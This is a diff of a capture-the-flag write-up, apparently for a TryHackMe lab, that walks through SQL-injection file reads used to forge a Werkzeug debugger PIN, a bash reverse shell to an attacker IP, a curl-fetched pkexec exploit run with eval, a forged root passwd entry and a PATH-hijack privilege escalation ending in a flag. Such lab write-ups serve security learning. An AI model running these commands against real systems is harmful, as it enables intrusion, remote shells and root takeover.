@@ -28,14 +28,17 @@
 # EXPLOIT
 + Trying to by pass PIN for werkerzeug 3.0.0 console.
 + Looting The File using SQL Injection File Export (LFI / SSRF):
-    - http://10.10.183.238:8000/download?id=' UNION ALL SELECT 'file:///proc/sys/kernel/random/boot_id
-    - http://10.10.183.238:8000/download?id=' UNION ALL SELECT 'file:///sys/class/net/eth0/address `02:e7:a8:eb:9a:87`
-    - http://10.10.183.238:8000/download?id=' UNION ALL SELECT 'file:///etc/machine-id `aee6189caee449718070b58132f2e4ba`
+    - http://10.10.211.16:8000/download?id=' UNION ALL SELECT 'file:///proc/sys/kernel/random/boot_id
+    - http://10.10.211.16:8000/download?id=' UNION ALL SELECT 'file:///sys/class/net/eth0/address 
+    `02:e7:a8:eb:9a:87`
+    - http://10.10.211.16:8000/download?id=' UNION ALL SELECT 'file:///etc/machine-id `aee6189caee449718070b58132f2e4ba`
+    - http://10.10.211.16:8000/download?id=' UNION ALL SELECT 'file:///proc/self/cgroup
 
     ```bash
 
 
-    $python -c "print(0x02e7a8eb9a87)" 
+    $python -c "print(0x02e7a8eb9a87)"   
+    python -c 'x = "".join("02:01:42:ff:bf:bb".split(":")); print(hex(x))'
     3193994713735
     $python gen_machine_id.py 
     b'aee6189caee449718070b58132f2e4ba'
@@ -55,12 +58,40 @@
         import os
         os.system('/bin/bash -c "bash -i >& /dev/tcp/10.4.37.160/1234 0>&1"')
         ```
-os.system('/bin/bash -c "bash -i >& /dev/tcp/10.4.37.160/3117 0>&1"')
-mcskidy@proddb:/dev/shm$ openssl passwd -1 -salt mcskidy dodol123
-mcskidy:$1$mcskidy$FFrXzk8I7YLmzrU3mA9YX/:0:0::/home/mcskidy:/bin/bash
-python3 -c 'import crypt;print(crypt.crypt("somesecret", crypt.mksalt(crypt.METHOD_SHA512)))'
-python3 -c 'import crypt,getpass;print(crypt.crypt(getpass.getpass(), crypt.mksalt(crypt.METHOD_SHA512)))'
-eval "$(curl -s http://10.4.37.160:81/CVE-2021-4034/cve-2021-4034.sh)"
 
-
-python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
+    + Look at log Git :
+        ```bash
+        mcskidy@proddb:~/app$ git diff e9855c8a10cb97c287759f498c3314912b7f4713
+        diff --git a/app.py b/app.py
+        index 5f5ff6e..875cbb8 100644
+        --- a/app.py
+        +++ b/app.py
+        @@ -10,7 +10,7 @@ app = Flask(__name__, static_url_path='/static')
+        # MySQL configuration
+        app.config['MYSQL_HOST'] = 'localhost'
+        app.config['MYSQL_USER'] = 'mcskidy'
+        -app.config['MYSQL_PASSWORD'] = 'F453TgvhALjZ'
+        +app.config['MYSQL_PASSWORD'] = 'fSXT8582GcMLmSt6'
+        app.config['MYSQL_DB'] = 'elfimages'
+        mysql = MySQL(app)
+        
+        @@ -18,5 +18,32 @@ mysql = MySQL(app)
+        def index():
+            return render_template("index.html")
+        
+        +@app.route("/download")
+        +def download():
+        +    file_id = request.args.get('id','')
+        +
+        +    if file_id!='':
+        +        cur = mysql.connection.cursor()
+        ```
+    + Add file with `echo 'bash' > /home/mcskidy/[` and then `chmod +x /home/mcskidy/[`
+    + After that run `sudo /usr/bin/bash /opt/check.sh`
+    + Got root priviledge
+    + Print all txt file on /root         
+        ```bash
+        root@proddb:/home/mcskidy# cat /root/*.txt
+        THM{BaNDiT_YeTi_Lik3s_PATH_HijacKing}
+        4-3f$FEBwD6AoqnyLjJ!!Hk4tc*V6w$UuK#evLWkBp
+        ```
